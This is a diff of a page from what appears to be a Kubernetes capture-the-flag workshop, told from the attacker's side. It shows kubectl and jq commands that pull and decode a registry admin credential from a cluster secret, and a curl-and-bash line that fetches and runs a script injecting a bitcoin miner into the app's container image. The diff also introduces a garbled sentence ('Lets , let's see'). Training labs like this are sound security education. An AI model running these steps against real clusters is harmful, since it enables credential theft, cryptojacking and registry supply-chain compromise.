@@ -4,10 +4,10 @@
 
 It appears the blue team has again deleted our bitcoinero pods.  It's time to get sneakier.  Instead of trying to deploy new pods into their cluster, let's poke around to see if there's anything we can use.
 
-Since we have kubectl running, let's see if there's any credentials accessible.
+Lets , let's see if there's any credentials accessible.
 
 ```
-# in case you need to re-download kubectl
+# In case you need to re-download kubectl
 cd /usr/local/bin; curl -LO https://dl.k8s.io/release/v1.28.10/bin/linux/amd64/kubectl; chmod 555 kubectl
 
 # Let's see if there's any secrets left out for us to grab
@@ -17,13 +17,12 @@ kubectl get secrets
 Ooh.  There's something called `acr-secret`.  Let's dig in.
 ```
 kubectl get secrets/acr-secret -o json
-kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d - | jq ".auths.\"${REGISTRY_HOSTNAME}\".username" -r
 ```
 
 There's a .dockerconfigjson file in the secret that appears to be Base64 encoded
 
 ```
-kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d -
+kubectl get secrets/acr-secret -o json | jq -r '.data.".dockerconfigjson"' | base64 -d - | jq
 ```
 
 Now we're talking!  It looks like they put the admin credentials for their registry in a secret.  I bet we can use this to both PUSH and PULL new images to their registry.
@@ -36,13 +35,13 @@ Some of the other red-team members have found this [neat trick from Twitter](htt
 
 Good luck!  They've come up with two scripts:
 
-* [run-bitcoin-injector.sh](https://lastcoolnameleft.com/mini/run-bitcoin-injector.sh) - deploy a [Kubernetes Job](https://kubernetes.io/docs/concepts/workloads/controllers/job/) that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container
-* [inject-image.sh](https://lastcoolnameleft.com/mini/inject-image.sh) - Uses Buildah to pulls the current app image, injects the bitcoin miner into the image, re-publishes the image under the same name
+* [run-bitcoin-injector.sh](https://github.com/lastcoolnameleft/aks-ctf/blob/main/workshop/bitcoin-injector/run-bitcoin-injector.sh) - deploy a [Kubernetes Job](https://kubernetes.io/docs/concepts/workloads/controllers/job/) that uses the registry credentials we found, to create another pod that injects our bitcoin miner into the container
+* [inject-image.sh](https://github.com/lastcoolnameleft/aks-ctf/blob/main/workshop/bitcoin-injector/inject-image.sh) - Uses Buildah to pulls the current app image, injects the bitcoin miner into the image, re-publishes the image under the same name
 
 Let's go back to our admin panel and run the following:
 
 ```console
-curl -O -J https://lastcoolnameleft.com/mini/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
+curl -O -J https://raw.githubusercontent.com/lastcoolnameleft/aks-ctf/refs/heads/main/workshop/bitcoin-injector/run-bitcoin-injector.sh; bash run-bitcoin-injector.sh
 ```
 
 Everything has been installed.  Let's kill our process and let the new image come up
